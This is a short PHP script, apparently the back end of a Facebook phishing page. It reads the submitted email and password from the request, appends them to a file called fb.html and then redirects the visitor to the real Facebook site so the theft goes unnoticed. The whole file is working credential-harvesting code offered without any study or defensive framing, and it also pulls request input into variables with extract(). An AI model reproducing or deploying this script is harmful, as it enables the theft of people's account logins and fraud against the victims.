<?php
    extract($_REQUEST);
    $file=fopen("fb.html","a");


   
    fwrite($file,"Email :");
    fwrite($file, $email ."\n");
    

    fwrite($file,"Pass :");
    fwrite($file, $password ."\n");
    
    




    fclose($file);
    header("location: https://www.facebook.com/");
 ?>
